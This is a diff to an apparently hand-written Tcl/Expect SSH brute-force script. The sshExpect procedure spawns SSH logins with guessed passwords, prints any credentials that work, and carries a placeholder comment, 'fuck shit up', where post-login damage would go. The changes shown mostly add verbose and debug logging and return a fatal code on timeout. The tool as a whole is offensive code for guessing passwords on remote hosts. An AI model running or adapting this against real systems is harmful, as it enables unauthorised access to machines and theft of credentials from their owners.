@@ -28,10 +28,12 @@ proc sshBruteForce {host} {
 
 # rtn: -1 fatal, 1 denied, 0 found pass
 proc sshExpect {host username password} {
-	set timeout 5 ;# maybe longer on www
-	log_user 0 ;# quiet mode
+	set expDebug 0 ;# 1 - print expect console; 0 - quiet
+	set verbose true
 	set dumpServerInfo false
+	set timeout 5 ;# maybe longer on www
 
+	log_user $expDebug ;# don't print output
 	set id [spawn ssh $username@$host]
 	expect {
 		-re "yes/no" {
@@ -39,6 +41,9 @@ proc sshExpect {host username password} {
 			exp_continue
 		}
 		-re "(Permission denied|Connection refused|No route to host)" {
+			if {$verbose} {
+				puts "$host (Permission denied|Connection refused|No route to host)"
+			}
 			close
 			exp_wait
 			return -1
@@ -52,6 +57,7 @@ proc sshExpect {host username password} {
 					return 1
 				}
 				-re "(\\\$|#)" {
+					# success!
 					puts "$username@$host password: $password"
 					if {$dumpServerInfo} {					
 						log_user 1
@@ -67,7 +73,7 @@ proc sshExpect {host username password} {
 					}
 
 					################
-					# fuck shit up
+					# fuck shit up #
 					################
 
 					close
@@ -76,30 +82,41 @@ proc sshExpect {host username password} {
 				}
 				timeout {
 					# have to enable log_user 1 at the start to debug
-					puts "<<<<<<<<<< unkown match"
-					send_user "$username@$host $password unkown expect match 1"
+					if {$expDebug >= 1} {
+						puts "<<<<<<<<<< unkown match"
+					}
+					if {$verbose} {					
+						puts "$username@$host $password unkown expect match after sending password"
+					}
 					close
 					exp_wait
 					return 1
-
 				}
-
 			} 
 		}
 		-re "(\\\$|#)" {
-			# public key login
 			puts "$host auto / pub key login"
 			close
 			exp_wait
 			return 0
 		}
 		timeout {
-			# have to enable log_user 1 at the start to debug
-			puts "<<<<<<<<<< unkown match"
-			send_user "$username@$host $password unkown expect match 2"
+			# port 22 can be 'open' with no service attached to it
+			# if this is the case we should return fatal here
+			# expect script needs to be reviewed to ensure we aren't 
+			# exiting simply because of bad regex
+
+			if {$expDebug >= 1} {
+				# have to enable log_user 1 at the start to debug
+				puts "<<<<<<<<<< unkown match"
+				puts "$username@$host $password unkown expect match initiating connection"
+			} 
+			if {$verbose} {			
+				puts "$host connection timeout"
+			}
 			close
 			exp_wait
-			return 1
+			return -1
 		}
 	}
 
